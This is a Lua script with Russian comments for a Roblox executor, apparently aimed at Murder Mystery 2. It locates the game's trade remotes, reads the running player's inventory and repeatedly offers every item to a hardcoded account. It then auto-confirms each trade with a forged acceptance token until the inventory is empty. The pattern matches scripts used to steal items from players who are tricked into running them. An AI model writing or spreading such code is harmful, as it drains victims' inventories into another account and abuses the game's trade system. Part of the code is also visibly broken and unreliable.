-- 🎁 MM2 AUTO MASS TRADE (БЕЗ require)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- =================  ПОИСК TRADE REMOTES =================
print("[INFO] Поиск Trade remotes...")

local Trade = nil
local SendRequest = nil
local StartTrade = nil
local UpdateTrade = nil
local OfferItem = nil
local AcceptTrade = nil
local DeclineTrade = nil

-- Путь 1: ReplicatedStorage.Trade
Trade = ReplicatedStorage:FindFirstChild("Trade")

-- Путь 2: ReplicatedStorage.Remotes.Trade
if not Trade then
    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
    if remotes then
        Trade = remotes:FindFirstChild("Trade")
    end
end

-- Путь 3: Поиск по всему ReplicatedStorage
if not Trade then
    local function findTrade(parent, depth)
        if depth > 3 or not parent then return nil end
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == "Trade" and child:IsA("Folder") then
                return child
            end
            local found = findTrade(child, depth + 1)
            if found then return found end
        end
        return nil
    end
    Trade = findTrade(ReplicatedStorage, 0)
end

if Trade then
    print("[OK] Trade folder найден: " .. Trade:GetFullName())
    
    SendRequest = Trade:FindFirstChild("SendRequest")
    StartTrade = Trade:FindFirstChild("StartTrade")
    UpdateTrade = Trade:FindFirstChild("UpdateTrade")
    OfferItem = Trade:FindFirstChild("OfferItem")
    AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    DeclineTrade = Trade:FindFirstChild("DeclineTrade")
    
    -- Проверка
    if not SendRequest then warn("[WARN] SendRequest не найден") end
    if not StartTrade then warn("[WARN] StartTrade не найден") end
    if not UpdateTrade then warn("[WARN] UpdateTrade не найден") end
    if not OfferItem then warn("[WARN] OfferItem не найден") end
    if not AcceptTrade then warn("[WARN] AcceptTrade не найден") end
else
    warn("[ERROR] Trade folder не найден!")
    return
end

-- ================= ⚙️ НАСТРОЙКИ =================
local TARGET_NAME = "artemka1223457"
local MAX_UNIQUE = 4
local TRADE_DELAY = 6  -- Кулдаун между трейдами

-- ================= 📦 ИНВЕНТАРЬ БЕЗ require =================
-- Способ 1: Через Remote (если найдём)
local GetInventory = nil

-- Ищем Remote для получения инвентаря
local remotes = ReplicatedStorage:FindFirstChild("Remotes")
if remotes then
    -- Пробуем разные названия
    local names = {"GetInventory", "RequestInventory", "FetchInventory", "LoadInventory", "Inventory"}
    for _, name in ipairs(names) do
        local remote = remotes:FindFirstChild(name)
        if remote and (remote:IsA("RemoteFunction") or remote:IsA("RemoteEvent")) then
            GetInventory = remote
            print("[OK] Найден Remote инвентаря: " .. name)
            break
        end
    end
end

-- Способ 2: Парсинг PlayerGui (фоллбэк)
local function parseInventoryFromGUI()
    local items = {}
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then return items end
    
    -- Ищем Inventory GUI
    local mainGui = playerGui:FindFirstChild("MainGUI")
    if not mainGui then return items end
    
    -- Рекурсивный поиск предметов
    local function searchItems(parent, depth)
        if depth > 5 or not parent then return end
        
        for _, child in ipairs(parent:GetChildren()) do
            -- Ищем кнопки/фреймы с именами предметов
            if child:IsA("Frame") or child:IsA("TextButton") then
                local nameLabel = child:FindFirstChild("Name") or child:FindFirstChild("ItemName")
                local amountLabel = child:FindFirstChild("Amount") or child:FindFirstChild("Count")
                
                if nameLabel and nameLabel:IsA("TextLabel") then
                    local itemName = nameLabel.Text
                    local amount = 1
                    
                    if amountLabel and amountLabel:IsA("TextLabel") then
                        amount = tonumber(string.match(amountLabel.Text, "%d+") or "1") or 1
                    end
                    
                    if itemName and itemName ~= "" and itemName ~= "Name" then
                        -- Определяем тип (Weapon/Pet)
                        local itemType = "Weapons"
                        if child.Name:lower():find("pet") or itemName:lower():find("pet") then
                            itemType = "Pets"
                        end
                        
                        table.insert(items, {
                            name = itemName,
                            type = itemType,
                            left = amount
                        })
                    end
                end
            end
            
            searchItems(child, depth + 1)
        end
    end
    
    searchItems(mainGui, 0)
    return items
end

-- Способ 3: Через ReplicatedStorage.Database (справочник)
local function getItemsFromDatabase()
    local items = {}
    local database = ReplicatedStorage:FindFirstChild("Database")
    if not database then return items end
    
    -- Ищем Weapons и Pets
    local function searchCategory(parent, category, depth)
        if depth > 2 or not parent then return end
        
        for name, _ in pairs(parent:GetChildren()) do
            if not name:find("Default") then
                table.insert(items, {
                    name = name,
                    type = category,
                    left = 999  -- Предполагаем что есть (нужно проверить)
                })
            end
        end
    end
    
    local weapons = database:FindFirstChild("Weapons")
    if weapons then searchCategory(weapons, "Weapons", 0) end
    
    local pets = database:FindFirstChild("Pets")
    if pets then searchCategory(pets, "Pets", 0) end
    
    return items
end

-- Главная функция получения инвентаря
local function getAvailableItems()
    local items = {}
    
    -- Метод 1: Через Remote
    if GetInventory then
        local ok, result = pcall(function()
            if GetInventory:IsA("RemoteFunction") then
                return GetInventory:InvokeServer()
            end
            return nil
        end)
        
        if ok and result then
            if type(result) == "table" then
                for name, amount in pairs(result) do
                    if type(amount) == "number" and amount > 0 then
                        local itemType = "Weapons"
                        if name:lower():find("pet") then itemType = "Pets" end
                        table.insert(items, {name = name, type = itemType, left = amount})
                    end
                end
            end
            print("[OK] Инвентарь получен через Remote: " .. #items .. " предметов")
            return items
        end
    end
    
    -- Метод 2: Парсинг GUI
    items = parseInventoryFromGUI()
    if #items > 0 then
        print("[OK] Инвентарь получен из GUI: " .. #items .. " предметов")
        return items
    end
    
    -- Метод 3: Database (фоллбэк)
    items = getItemsFromDatabase()
    if #items > 0 then
        print("[OK] Инвентарь получен из Database: " .. #items .. " предметов")
        return items
    end
    
    warn("[WARN] Не удалось получить инвентарь!")
    return items
end

-- ================= 🔄 ЛОГИКА ТРЕЙДА =================
local itemsGiven = {}
local currentLastOffer = nil

-- Отслеживание LastOffer
if UpdateTrade then
    UpdateTrade.OnClientEvent:Connect(function(data)
        if data and data.LastOffer then
            currentLastOffer = data.LastOffer
        end
    end)
end

local function runTradeCycle()
    local available = getAvailableItems()
    
    if #available == 0 then
        print("\n[SUCCESS] ВСЕ ПРЕДМЕТЫ ОТДАНЫ!")
        return false
    end

    -- Фильтруем уже отданные
    local filtered = {}
    for _, it in ipairs(available) do
        local given = itemsGiven[it.name] or 0
        local left = it.left - given
        if left > 0 and it.name ~= "DefaultKnife" and it.name ~= "DefaultGun" then
            table.insert(filtered, {name = it.name, type = it.type, left = left})
        end
    end
    
    if #filtered == 0 then
        print("\n[SUCCESS] ВСЕ ПРЕДМЕТЫ ОТДАНЫ!")
        return false
    end

    -- Берём батч
    local batch = {}
    local maxItems = math.min(MAX_UNIQUE, #filtered)
    for i = 1, maxItems do
        table.insert(batch, filtered[i])
    end

    print("\n[INFO] Новый трейд - Предметов: " .. #batch)
    for i, it in ipairs(batch) do
        print("   " .. i .. ". " .. it.name .. " x" .. it.left)
    end

    -- Ищем цель
    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then
        warn("[ERROR] Игрок не найден: " .. TARGET_NAME)
        return true
    end

    -- Отправляем запрос
    if SendRequest then
        local reqOk = pcall(function()
            return SendRequest:InvokeServer(target)
        end)
        
        if not reqOk then
            warn("[ERROR] Запрос не удался")
            return true
        end
    end

    -- Ждём StartTrade
    local started = false
    local sc
    if StartTrade then
        sc = StartTrade.OnClientEvent:Connect(function(_, pName)
            if pName == TARGET_NAME then
                started = true
                if sc then sc:Disconnect() sc = nil end
            end
        end)
    end
    
    local t0 = tick()
    while not started and tick() - t0 < 10 do
        task.wait(0.5)
    end
    
    if not started then
        warn("[ERROR] Трейды не открылся")
        if sc then sc:Disconnect() sc = nil end
        return true
    end

    currentLastOffer = nil
    
    print("[INFO] Трейды открыт. Выкладываю предметы...")

    -- Выкладываем предметы
    if OfferItem then
        for _, it in ipairs(batch) do
            for i = 1, it.left do
                local ok = pcall(function()
                    OfferItem:FireServer(it.name, it.type)
                end)
                
                if ok then
                    itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
                    print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
                end
                
                task.wait(0.25)
            end
        end
    end

    -- Ждём кулдаун
    print("[INFO] Ожидание " .. TRADE_DELAY .. "с кулдауна...")
    task.wait(TRADE_DELAY)
    
    -- Ждём LastOffer
    if not currentLastOffer then
        print("[INFO] Ожидание LastOffer...")
        local t1 = tick()
        while not currentLastOffer and tick() - t1 < 5 do
            task.wait(0.5)
        end
    end

    -- Подтверждаем трейды
    if currentLastOffer and AcceptTrade then
        print("[INFO] Ожидание 0.5с перед подтверждением...")
        task.wait(0.5)
        
        print("[INFO] Подтверждение трейда...")
        local confirmOk = pcall(function()
            AcceptTrade:FireServer(game.PlaceId * 3, currentLastOffer)
        end)
        
        if not confirmOk then
            warn("[ERROR] Подтверждение не удалось")
        end
    else
        warn("[WARN] LastOffer не получен")
    end

    -- Ждём завершения
    local done = false
    local ac
    if AcceptTrade then
        ac = AcceptTrade.OnClientEvent:Connect(function()
            done = true
            if ac then ac:Disconnect() ac = nil end
        end)
    end
    
    local t2 = tick()
    while not done and tick() - t2 < 15 do
        task.wait(0.5)
    end
    
    if ac then ac:Disconnect() ac = nil end

    print("[INFO] Трейды завершён. Ожидание " .. TRADE_DELAY .. "с...")
    task.wait(TRADE_DELAY)
    
    return true
end

-- ================= 🚀 ЗАПУСК =================
print("\n[START] AUTO-TRADE SYSTEM")
print("[TARGET] " .. TARGET_NAME)
print("[MAX_UNIQUE] " .. MAX_UNIQUE)
print("")

while runTradeCycle() do end

print("[DONE] Завершено")
